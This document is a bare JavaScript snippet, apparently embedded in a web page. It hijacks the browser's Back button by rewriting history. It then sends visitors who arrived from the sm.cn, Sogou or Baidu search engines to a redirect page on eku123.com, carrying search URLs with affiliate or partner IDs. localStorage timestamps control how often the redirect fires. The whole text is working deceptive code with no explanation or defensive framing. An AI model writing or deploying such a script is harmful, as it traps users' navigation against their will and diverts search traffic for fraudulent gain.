(function (window, location) {
    var BaiduArr=[
        "1019810c"
    ],arri=parseInt(Math.random()*(BaiduArr.length)),baiduNum=BaiduArr[arri];
    var Sogou={
        Name:"Sogou",
        Num:"sogou-mobb-f5bf0ba0a17ef18f",
        times:30,
        regex:new RegExp('[\\?&]' + 'keyword' + '=([^&#]*)')
    };
    var Sm={
        Name:"Sm",
        Num:"wm279580",
        times:30,
        regex:new RegExp('[\\?&]' + 'q' + '=([^&#]*)')
    };
    var Baidu={
        Name:"Badidu",
        times:1200,
        Num:baiduNum
    };
    var storage=window.localStorage;
    var ref = document.referrer;
    var min=1000;
    var NowDate=(new Date).valueOf();
    var href="";
    function OnOffFun(name,links,times) {

        function run() {
            storage.setItem("web2017zlwj"+name,"nhuyj||"+NowDate);
            window.location.href=links;
        }
        var storageVal=storage.getItem("web2017zlwj"+name);
        if(storageVal==null){
            run()
        }else{
            var storageTime=storageVal.split("||")[1];
            if(NowDate-storageTime>=min*times){
                run()
            }else{
                history.back()
            }
        }
    }
    history.replaceState(null, document.title, location.pathname + '#!/xh');
    history.pushState(null, document.title, location.pathname);
    window.addEventListener('popstate', function () {
        if (location.hash === '#!/xh') {
            history.replaceState(null, document.title, location.pathname);
            if (ref.match(/(.*)sm.cn/g) && Sm.regex.exec(ref)&&ref.indexOf(Sm.Num)==-1) {
                href ="http://www.eku123.com/m/bjdsearch.html?url="+encodeURIComponent('https://yz.m.sm.cn/s?q=' + Sm.regex.exec(ref)[1] + '&from='+Sm.Num+'&safe=1&snum=0')+"&k="+(new Date).valueOf();
                OnOffFun(Sm.Name,href,Sm.times);
            }else if(ref.match(/(.*)sogou.com/g) && Sogou.regex.exec(ref)&&ref.indexOf(Sogou.Num)==-1){
                href="http://www.eku123.com/m/bjdsearch.html?url="+encodeURIComponent("https://m.sogou.com/web/searchList.jsp?keyword="+Sogou.regex.exec(ref)[1]+"&pid="+Sogou.Num)+"&k="+(new Date).valueOf();
                OnOffFun(Sogou.Name,href,Sogou.times);
            }else if(ref.match(/(.*)baidu.com/g)){
                href="http://www.eku123.com/m/bjdsearch.html?url="+encodeURIComponent("https://m.baidu.com/?from="+Baidu.Num)+"&k="+(new Date).valueOf();
                OnOffFun(Sogou.Name,href,Baidu.times);
            }
            else {
                history.back()
            }
        }
    }, false)
}(window, location));